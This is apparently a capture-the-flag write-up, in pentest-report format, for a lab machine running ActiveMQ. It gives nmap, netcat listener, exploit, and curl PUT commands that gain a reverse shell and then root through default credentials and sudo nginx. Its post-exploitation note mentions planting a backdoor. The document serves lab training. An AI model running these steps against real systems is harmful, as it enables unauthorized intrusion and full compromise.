## Initial Access - Weak Credentials + Publicly Available Exploit leads to RCE
  
**Vulnerability Explanation:** The web server on port 80 is running with weak credentials admin:admin. This allows for access to the application. A publicly available exploit is available off of github and can be used to gain RCE to the machine.

**Vulnerability Fix:** The credentials to the webserver are compromised and should be changed immediately. Replace credentials with a strong one or remove webserver if not needed.

**Severity:** Critical

**Steps to reproduce the attack:** The initial scan revealed that TCP port 80 is open. The site is protected with a login prompt but is easily passed with weak credentials of admin:admin. Christian discovered a vulnerable application called 'ActiveMQ' running. A public exploit was found off of github and used to gain RCE.

**Port Scan Results**  

**TCP:** 80

**UDP:** NA

Use nmap to scan the target for open ports.

TCP port 22, 80 was discovered.

```shell

sudo nmap -p- -T5 10.10.11.243 -oN nmap.initial

```

Navigating to the server via web browser reveals a login prompt. Credentials are **admin:admin**.

The webserver is running an application called 'ActiveMQ'. A publicly available exploit can be found on github. The exploit requires us to host the poc.xml file. The poc.xml file also needs to be updated with our ip.

Open a nc listener to catch the incoming shell and run the exploit.
```
nc -nlvp 9001
```

```
python exploit.py -i 10.10.11.243 -u http://10.10.16.7/poc.xml
```

We have successfully obtained initial access to the target machine as user 'activemq'.

## Privilege Escalation - Sudo Privileges + SSH-keygen

**Vulnerability Explanation:** The user 'activemq' has access to run a command with sudo privileges. This allows for an attacker to start a webserver and access the file system as 'root'. A malicious ssh key can be uploaded and used to gain root access to the machine. 

**Vulnerability Fix:** Remove the available sudo privileges command from the 'activemq' account if not needed.

**Severity:** Critical

**Steps to reproduce the attack:** Christian ran the command 'sudo -l' to list the sudo privileged commands available to the user 'activemq'. A command was found using 'nginx'. Starting the server allows access to the file system as 'root'. Christian created an ssh key via 'ssh-keygen' and placed it into the root /.ssh/authorized_keys folder to gain access via ssh.

Check sudo privileges for user 'activemq' with 'sudo -l.' It has sudo privileges to run 'nginx'.

```
sudo -l
```

Create a configuration file that allows us to access the webserver and PUT method.

![img-description](/assets/img/HTB/BROKER/12.png)
Move the file to the target machine via the previously created python webserver.
```
wget http://10.10.16.7/exploit.conf
```

Start the webserver with our exploit.conf file and sudo.
```
sudo /usr/sbin/nginx -c ~/exploit.conf
```

We can now access the file system as root.

Create an ssh key pair using ssh-keygen.
```
ssh-keygen
```

Transfer the 'id_rsa.pub' file to the target machine. Then put it into the root /.ssh/authorized_keys folder  via the web servers.
```
wget http://10.10.16.7/id_rsa.pub .
```
```
curl -X PUT http://10.10.11.243:1234/root/.ssh/authorized_keys --upload-file ~/id_rsa.pub
```

Root access to machine was successfully obtained via SSH.
```
ssh root@10.10.11.243
```

## Post Exploitation 

Since this is a CTF the objective is only to retreive the flag located in the /root directory as a privileged user. 

In a real world assessment, we would attempt to add a back door for continuous access to the machine.
